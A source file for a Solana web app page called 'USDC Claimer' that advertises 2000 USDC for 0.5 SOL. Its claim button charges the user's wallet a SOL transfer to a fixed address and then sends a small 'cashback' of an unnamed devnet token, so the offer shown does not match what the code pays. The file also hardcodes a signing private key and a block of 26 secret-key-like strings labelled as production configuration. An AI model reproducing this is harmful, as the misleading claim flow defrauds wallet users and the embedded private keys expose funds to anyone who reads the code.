/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "RFhfTYdXBH5R1futYZesvdstjH4a7eyLgWWntSjHopdHngfjrPUen2d7r1vm15yzPmiWsq1nVjQWXMrWuyrkfJZ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4UmadEwJRmy2ntefpqaY3XXfNN5UwyZMxyxLu3BqfdW3Z3zMiA67xyRbRz7ZZs96Cn2FLEDHgCDopYYPibdzQZg7",
  "key1": "YxzL5gPDEvA5D9iuLgcf9o4fVWaXVkDaJbAojgdktkfiPAta13Zo1w9RpmUJsS9XxMU9hWVyQF1NZqNFqvUtcb2",
  "key2": "3n7qJLE6WT9qrcwqWZe3iV23SZ4qK11krJYtd6R1m25Gveo9tNUfHd3rv4pU8jTvLxfsWEmNd93cyooFSRAFzaDP",
  "key3": "2QdKnRoWgQo5TX6qd8eCb1zKXf13MLZBL8Fcw6voRB9LjvyBahVLMpLJ9gcJpEpFw6ncJMkiRf1XPdb6hyMJpHci",
  "key4": "5yGtGfuDArNKPBN37xJYBDtKRG6XnKbsfUbJhjKN7hc4TMNS12BuZpHSNjXsc73bPCgUXN4DoanR6UMqmHioHkqm",
  "key5": "zM29MAQVE6inLpNFYQwGjaNkaKoEiMHV3HfXPQn6mra3Kff8QPH2RuhszSkSvbYm9u7wfTyrL7UUjC6ojP2eB3q",
  "key6": "63h121WsXCFyEr3sM4qhKbQfr1RjS9aED8tz6G1SxCvdsKKyGiZiQeWutAHXmc7zZExNkV7EGEZ1hjnFu3ewVKCm",
  "key7": "5KCUF3jP5oP1tdTNUMWAiisGCLG4rpvfn1eCFDk38sUokpaWxa5HN5afauodSFaaUZNi7qhGfw1xni6Fx5zzumuB",
  "key8": "65xaiWw4e78Aom6M4jbmgVMBv4V9CEnHiFrkuULchNpY9uDXpX6Q54fu3heBGUKqHLnJiN15c4Ty164EAir5xy9r",
  "key9": "5zEEUcHg5XbAhbvMXg7E1TuaLSzv9X12Q9G28BjAtZXEw1afKe8dAPzVCGTULHFnkKNvjNk1CxQ6m8vauoyCZcU5",
  "key10": "65mnb8MgqnHwHBExsWKU5v294gkX7R5M8Ke3J5QDiKxwSLHjkgZ4KZXfvduZtWMMJJGEYmrHpTz4khdu5nw6hPLq",
  "key11": "2phmpvYyBcCdq9UfBZU2vUDJ2999xqPW1QDt5vK71KLegJTfhSDwtESxQDnDK3xWZ3fzYDvPpDKK6Hzkfn7cr5L",
  "key12": "3PJ1QTx9uv8L837nSqEu8iWqbn1wm358sbfzR73mrsf5zLYMFMPcjX9kpZf7ebULRpZAGiCUg7evg4vq6JRH1jj6",
  "key13": "3U76uDvvH5vabgmMMfaXA7WcyQiVqHB2bg1rk2HH97u6si5MfRxruZRarZuLqiKimjC7nfppgGeqrJzBV2Pvb9vC",
  "key14": "2sZKZTs6aHkJAAarifyzSfBgRizY2q4tCSj1j31evp5VGNhd9C4VBcYoqTa4mvseufEDfUD4EG9pLpMDqYXwWnfL",
  "key15": "3Tr3nGTcu4zLJQGX1YTBQ6rGEYQ2NwV717bCSSy6PynV4GbeoKoQEp19n7RaxCTcdmZEjoDv32QnD7NbUp1AXysC",
  "key16": "4Sy9JcPTfRW3eNkV4ZtsZ2PTUmDpVtNoHZtdiqrKQ63iRAvK8StKCDxTArbp4vf59HGnHARSgXs6pedGk9eAyMKP",
  "key17": "2oYSAkY2drA6dCuX9aBYuDNqCCYWYCviNcDN1mqD6a9MC32J6oKMBpz3ECgYW9do6EdJGMD5coUAjfKGHjpfzYAG",
  "key18": "VzAr3ExW9qPGvfZXw8djPmd7gVtMabo5TiSdtbz5m8jR6Qk8jTnZsSiShT5iXPcoZEfjHvrWVsAFjRneUVPJ53h",
  "key19": "zaXBXGwFQa5FaprvxWQirJHsDBsQy9RDcPpVqrsDUygqbWRj3hMHuKTVXgrPAAJNvNoWT4sB3xkZ7Q8tL8XuDdG",
  "key20": "3N2j8bB4CK1k8JAEVmboaA25762AyVAXzPaKjhyYDn3eyBhUGqVd5itzryGkaQxAsVnQ2xBaduY712ZzK1x4EP4b",
  "key21": "8hCH6KCmjeTMAF9ya6eePR2TnNvdmDaA11j4rgUNwmfxomv5a8SnvbAeDciLgQdquxifbVV6e6RRmi3xveLv3HZ",
  "key22": "2rfGSKoUQvHwNoP7PCuwAqfvGttBBpbsxJujgmkWFcM7EERsqVZQN5k3iSNNv4NoxR8hXsgZj6n1Gyz94nTU54p",
  "key23": "hRVxevnF7mZcQ8BgqoCS1cADcnSukPYd3NkY6JiacATdCm9bwK2LyUaWR89yCkgvs7o6q67pCFqKcwDFo94RJwF",
  "key24": "571vaoYzWyhm7xyYSMw8gcNGTCMt73yjBaEuXzBq7LM7oX6K8bKPAyLekZ6Wm42ejX28HgUKEUtiEMH4Tmujckrk",
  "key25": "66crJQiG1HGiyufJAUH5B472remueGytgdMxP1SxW3iqGtZGc1o7FibdFaCWw77CmRXapoxneBDtSfANuoRYJaNs"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
